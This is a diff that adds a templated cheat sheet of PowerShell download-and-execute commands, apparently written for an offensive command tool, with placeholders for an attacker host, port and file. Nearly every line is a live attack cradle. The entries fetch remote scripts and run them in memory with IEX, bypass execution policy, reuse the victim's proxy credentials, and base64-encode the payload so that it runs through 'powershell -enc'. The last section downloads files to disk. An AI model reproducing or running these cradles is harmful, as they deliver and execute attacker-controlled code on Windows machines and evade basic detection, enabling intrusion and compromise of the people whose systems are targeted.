@@ -1,0 +1,30 @@
+--- Download & Execute
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://#{LHOST}:#{LPORT}/#{file}')"
+
+echo IEX(New-Object Net.WebClient).DownloadString('http://#{LHOST}:#{LPORT}/#{file}') | powershell -noprofile - 
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://#{LHOST}:#{LPORT}/#{file}')|iex"
+
+# desc: PSv3
+iex (iwr 'http://#{LHOST}:#{LPORT}/#{file}') 
+
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://#{LHOST}:#{LPORT}/#{file}',$false);$h.send();iex $h.responseText
+
+$wr = [System.NET.WebRequest]::Create("http://#{LHOST}:#{LPORT}/#{file}") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+
+--- Using b64 from linux
+
+# desc: Encode Base64 
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://#{LHOST}:#{LPORT}/#{file}')" | iconv -t UTF-16LE | base64 -w 0
+
+# desc: Decode and Execute
+powershell -nop -enc #{base64_encode_payload}
+
+--- Download
+
+(New-Object Net.WebClient).DownloadFile("http://#{LHOST}:#{LPORT}/#{file}","#{dest_path}")
+
+Invoke-WebRequest "http://#{LHOST}:#{LPORT}/#{file}" -OutFile "#{dest_path}"
+
+wget "http://#{LHOST}:#{LPORT}/#{file}" -OutFile "#{dest_path}"
